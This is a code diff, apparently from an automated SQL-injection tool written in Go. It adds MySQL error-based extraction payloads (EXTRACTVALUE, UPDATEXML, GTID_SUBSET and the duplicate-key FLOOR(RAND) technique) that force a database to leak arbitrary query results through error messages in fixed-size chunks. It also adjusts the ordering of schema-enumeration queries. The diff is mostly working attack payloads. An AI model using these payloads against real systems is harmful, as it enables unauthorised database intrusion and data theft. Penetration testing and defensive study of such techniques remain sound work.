@@ -62,6 +62,16 @@ type Queries struct {
 	QuoteIdent func(name string) string
 }
 
+// ErrorFn describes one error-based data-leak channel: an expression family
+// that, when evaluated, makes the DBMS echo the value of e inside an error
+// message. Chunk caps how many characters a single error reveals, so values
+// longer than Chunk are read positionally in Chunk-sized pieces.
+type ErrorFn struct {
+	Name  string
+	Build func(e string) string // returns an expression mishandling (e)
+	Chunk int                   // max characters revealed per error message
+}
+
 // Extract describes how to splice a boolean/time predicate around an arbitrary
 // expression and how to read back a scalar value through each technique.
 type Extract struct {
@@ -96,6 +106,10 @@ type Extract struct {
 	// scalar value in a way the response will reveal (used by OS/file where a
 	// result is required). For blind engines this is unused.
 	Direct func(e string) string
+
+	// Errors lists the error-based leak channels, tried in order. An empty
+	// slice means the backend has no useful error channel.
+	Errors []ErrorFn
 }
 
 // postRegistry holds per-DBMS post-detection queries.
@@ -162,10 +176,10 @@ func mysqlPost() *Queries {
 			return "SELECT schema_name FROM information_schema.schemata"
 		},
 		ListTables: func(db string) string {
-			return "SELECT table_name FROM information_schema.tables WHERE table_schema='" + db + "'"
+			return "SELECT table_name FROM information_schema.tables WHERE table_schema='" + db + "' ORDER BY table_name"
 		},
 		ListCols: func(db, table string) string {
-			return "SELECT column_name FROM information_schema.columns WHERE table_schema='" + db + "' AND table_name='" + table + "'"
+			return "SELECT column_name FROM information_schema.columns WHERE table_schema='" + db + "' AND table_name='" + table + "' ORDER BY ORDINAL_POSITION"
 		},
 		CountRows: func(db, table string) string {
 			return "SELECT count(*) FROM " + quoteIdent(db) + "." + quoteIdent(table)
@@ -246,6 +260,36 @@ func mysqlPost() *Queries {
 			},
 			Direct: func(e string) string {
 				return "SELECT " + "(" + e + ")"
+			},
+			Errors: []ErrorFn{
+				{
+					Name:  "extractvalue",
+					Chunk: 30,
+					Build: func(e string) string {
+						return "EXTRACTVALUE(1,CONCAT(0x7e,(" + e + "),0x7e))"
+					},
+				},
+				{
+					Name:  "updatexml",
+					Chunk: 30,
+					Build: func(e string) string {
+						return "UPDATEXML(1,CONCAT(0x7e,(" + e + "),0x7e),1)"
+					},
+				},
+				{
+					Name:  "gtid-subset",
+					Chunk: 30,
+					Build: func(e string) string {
+						return "GTID_SUBSET(CONCAT(0x7e,(" + e + "),0x7e),1)"
+					},
+				},
+				{
+					Name:  "duplicate-key",
+					Chunk: 58,
+					Build: func(e string) string {
+						return "(SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e7e,(" + e + "),0x7e7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
+					},
+				},
 			},
 		},
 		StackedOK:  true,
